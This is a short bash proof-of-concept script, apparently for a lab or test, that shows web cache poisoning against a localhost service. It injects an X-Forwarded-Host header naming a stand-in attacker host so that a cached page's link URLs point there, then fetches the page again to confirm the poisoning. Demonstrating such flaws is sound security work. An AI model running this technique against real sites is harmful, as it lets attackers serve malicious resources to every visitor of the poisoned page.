#!/bin/bash
# PoC: Poison <link href>
echo "[*] Step 1: Poison cache"
curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-Host: evil.example.com" "http://localhost:6000"
echo ""
echo "[*] Step 2: Normal request (should show poisoned content)"
curl -s "http://localhost:6000"
echo ""
